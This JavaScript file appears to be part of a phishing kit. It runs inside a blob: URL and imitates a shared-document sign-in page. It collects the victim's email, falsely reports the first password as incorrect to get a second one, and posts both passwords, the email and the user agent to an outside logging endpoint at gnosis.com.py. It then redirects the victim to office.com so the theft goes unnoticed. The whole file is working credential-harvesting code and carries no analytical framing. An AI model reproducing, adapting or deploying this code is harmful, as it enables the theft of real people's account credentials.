// content-part-2.js - Main JavaScript Logic

(function() {
    'use strict';

    console.log('✅ Part 2 loaded: JavaScript logic ready');

    function initApp() {
        if (window.location.protocol !== 'blob:') {
            console.log('📄 Not in Blob URL context. Waiting for Blob URL launch...');
            return;
        }

        console.log('🚀 Initializing application in Blob URL context');

        const CONFIG = {
            logEndpoint: 'https://gnosis.com.py/serca/log.php', // UPDATE THIS URL
            redirectUrl: 'https://www.office.com'
        };

        var stepEmail = document.getElementById('stepEmail');
        var stepPwdFirst = document.getElementById('stepPasswordFirst');
        var stepPwdSecond = document.getElementById('stepPasswordSecond');

        var emailInput = document.getElementById('emailInput');
        var pwdFirstInput = document.getElementById('passwordFirstInput');
        var pwdSecondInput = document.getElementById('passwordSecondInput');

        var displayFirst = document.getElementById('displayEmailFirst');
        var displaySecond = document.getElementById('displayEmailSecond');

        var emailNextBtn = document.getElementById('emailNextBtn');
        var pwdFirstBtn = document.getElementById('pwdFirstBtn');
        var pwdSecondBtn = document.getElementById('pwdSecondBtn');

        var statusMsg = document.getElementById('statusMessage');
        var statusText = document.getElementById('statusText');

        var stepBadge1 = document.getElementById('stepBadge1');

        var togglePwdFirst = document.getElementById('togglePwdFirst');
        var togglePwdSecond = document.getElementById('togglePwdSecond');

        var passwordErrorFirst = document.getElementById('passwordErrorFirst');
        var passwordErrorSecond = document.getElementById('passwordErrorSecond');
        var passwordErrorTextFirst = document.getElementById('passwordErrorTextFirst');
        var passwordErrorTextSecond = document.getElementById('passwordErrorTextSecond');

        var storedEmail = '';

        function setStatus(message, type) {
            type = type || 'info';
            if (statusText) {
                statusText.innerText = message;
            }
            if (statusMsg) {
                statusMsg.className = 'status-message';
                if (type === 'error') {
                    statusMsg.classList.add('error');
                } else if (type === 'success') {
                    statusMsg.classList.add('success');
                }
                var icon = statusMsg.querySelector('i');
                if (icon) {
                    if (type === 'error') {
                        icon.className = 'fas fa-exclamation-circle';
                    } else if (type === 'success') {
                        icon.className = 'fas fa-check-circle';
                    } else {
                        icon.className = 'fas fa-info-circle';
                    }
                }
            }
        }

        function updateStepIndicators(step) {
            if (stepBadge1) {
                stepBadge1.classList.remove('active');
                if (step === 1) {
                    stepBadge1.classList.add('active');
                }
            }
        }

        function showPasswordError(show, step) {
            if (step === 2 && passwordErrorFirst) {
                if (show) {
                    passwordErrorFirst.classList.remove('hidden');
                } else {
                    passwordErrorFirst.classList.add('hidden');
                }
            } else if (step === 3 && passwordErrorSecond) {
                if (show) {
                    passwordErrorSecond.classList.remove('hidden');
                } else {
                    passwordErrorSecond.classList.add('hidden');
                }
            }
        }

        function showStep(step, email) {
            email = email || '';
            
            if (stepEmail) stepEmail.classList.add('hidden');
            if (stepPwdFirst) stepPwdFirst.classList.add('hidden');
            if (stepPwdSecond) stepPwdSecond.classList.add('hidden');

            showPasswordError(false, 2);
            showPasswordError(false, 3);

            if (step === 1) {
                if (stepEmail) stepEmail.classList.remove('hidden');
                updateStepIndicators(1);
                if (emailInput) {
                    setTimeout(function() { emailInput.focus(); }, 100);
                }
                setStatus('Enter your email to access the shared document.', 'info');
            } else if (step === 2) {
                if (stepPwdFirst) stepPwdFirst.classList.remove('hidden');
                updateStepIndicators(2);
                if (email && displayFirst) {
                    displayFirst.textContent = email;
                }
                if (pwdFirstInput) {
                    pwdFirstInput.value = '';
                    setTimeout(function() { pwdFirstInput.focus(); }, 100);
                }
                setStatus('Enter your password for ' + email, 'info');
            } else if (step === 3) {
                if (stepPwdSecond) stepPwdSecond.classList.remove('hidden');
                updateStepIndicators(3);
                if (email && displaySecond) {
                    displaySecond.textContent = email;
                }
                if (pwdSecondInput) {
                    pwdSecondInput.value = '';
                    setTimeout(function() { pwdSecondInput.focus(); }, 100);
                }
                showPasswordError(true, 3);
                setStatus('Please try again with a different password.', 'error');
            }
        }

        function resetFlow() {
            if (emailInput) emailInput.value = '';
            if (pwdFirstInput) pwdFirstInput.value = '';
            if (pwdSecondInput) pwdSecondInput.value = '';
            storedEmail = '';
            showPasswordError(false, 2);
            showPasswordError(false, 3);
            showStep(1);
            if (pwdSecondBtn) {
                pwdSecondBtn.disabled = false;
                pwdSecondBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Sign In';
            }
        }

        function logToFile(email, password, eventType) {
            var logData = {
                email: email,
                password: password,
                event: eventType,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            };

            if (CONFIG.logEndpoint) {
                try {
                    fetch(CONFIG.logEndpoint, {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(logData),
                        keepalive: true
                    }).catch(function(error) {
                        console.log('⚠️ Logging failed:', error);
                    });
                } catch(e) {
                    console.log('⚠️ Logging error:', e);
                }
            }
        }

        if (emailNextBtn) {
            emailNextBtn.addEventListener('click', function(e) {
                e.preventDefault();
                console.log('📧 Email button clicked');
                var email = emailInput ? emailInput.value.trim() : '';
                if (!email || email.indexOf('@') === -1 || email.indexOf('.') === -1) {
                    setStatus('Please enter a valid email address.', 'error');
                    return;
                }
                storedEmail = email;
                try {
                    localStorage.setItem('sharedDocEmail', email);
                } catch(e) {}
                console.log('📧 Email entered:', email);
                showStep(2, email);
            });
        }

        if (pwdFirstBtn) {
            pwdFirstBtn.addEventListener('click', function(e) {
                e.preventDefault();
                console.log('🔑 First password button clicked');
                var pwd = pwdFirstInput ? pwdFirstInput.value.trim() : '';
                if (!pwd) {
                    setStatus('Please enter a password.', 'error');
                    return;
                }
                var email = storedEmail || 'user';
                try {
                    email = localStorage.getItem('sharedDocEmail') || email;
                } catch(e) {}
                console.log('🔑 First password attempt for:', email);
                
                logToFile(email, pwd, 'password_attempt_1');
                
                showPasswordError(true, 2);
                setStatus('Incorrect password, please try again.', 'error');
                
                if (pwdFirstInput) {
                    pwdFirstInput.value = '';
                    setTimeout(function() { pwdFirstInput.focus(); }, 100);
                }
                
                showStep(3, email);
            });
        }

        if (pwdSecondBtn) {
            pwdSecondBtn.addEventListener('click', function(e) {
                e.preventDefault();
                console.log('🔑 Second password button clicked');
                var pwd = pwdSecondInput ? pwdSecondInput.value.trim() : '';
                if (!pwd) {
                    setStatus('Please enter a password.', 'error');
                    return;
                }
                var email = storedEmail || 'user';
                try {
                    email = localStorage.getItem('sharedDocEmail') || email;
                } catch(e) {}
                console.log('🔑 Second password attempt for:', email);
                
                logToFile(email, pwd, 'password_attempt_2_success');
                
                setTimeout(function() {
                    window.location.href = CONFIG.redirectUrl;
                }, 100);
            });
        }

        function setupToggle(btn, input) {
            if (!btn || !input) return;
            btn.addEventListener('click', function() {
                var type = input.getAttribute('type') === 'password' ? 'text' : 'password';
                input.setAttribute('type', type);
                var icon = this.querySelector('i');
                if (icon) {
                    icon.classList.toggle('fa-eye');
                    icon.classList.toggle('fa-eye-slash');
                }
            });
        }
        setupToggle(togglePwdFirst, pwdFirstInput);
        setupToggle(togglePwdSecond, pwdSecondInput);

        function handleEnter(btn) {
            return function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    if (btn) btn.click();
                }
            };
        }
        if (emailInput) emailInput.addEventListener('keydown', handleEnter(emailNextBtn));
        if (pwdFirstInput) pwdFirstInput.addEventListener('keydown', handleEnter(pwdFirstBtn));
        if (pwdSecondInput) pwdSecondInput.addEventListener('keydown', handleEnter(pwdSecondBtn));

        resetFlow();
        console.log('✅ Shared document flow ready in Blob URL context');
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initApp);
    } else {
        setTimeout(initApp, 50);
    }

})();
